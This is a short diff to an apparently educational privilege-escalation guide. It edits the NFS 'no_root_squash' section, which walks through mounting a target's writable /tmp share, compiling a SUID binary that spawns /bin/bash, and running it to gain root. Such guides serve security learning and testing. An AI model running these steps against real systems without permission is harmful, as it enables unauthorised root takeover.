@@ -337,7 +337,6 @@ If we find a share that is both writable and is “no_root_squash”, we mount i
 
 > mkdir /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
 > mount -o rw <TARGET_IP>:/tmp /tmp/<FOLDERNAME_WHERE_WE_WILL_PUT_OUR_EXECUTABLE>
-Run the command 'ls -la' on your device and on the target_IP device; it should show the same files in the /tmp directory on both your device and the target_IP device.
 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
 Now create a executable file that will run “/bin/bash” on the target system upon execution:
 > nano <FILENAME>.c
@@ -351,7 +350,7 @@ Now compile the executable:
 > gcc <FILENAME>.c -o <OUTPUT_FILENAME> -w
 Set SUID bit:
 > chmod +s <OUTPUT_FILENAME>
-The 'ls -la' command should show the executable on the target_IP.
+The 'ls -la' command in the target_IP's ssh terminal should show the executable now present on the target_IP.
 Run the executable from the target_IP:
 > ./<OUTPUT_FILENAME>
 Check if you have root:
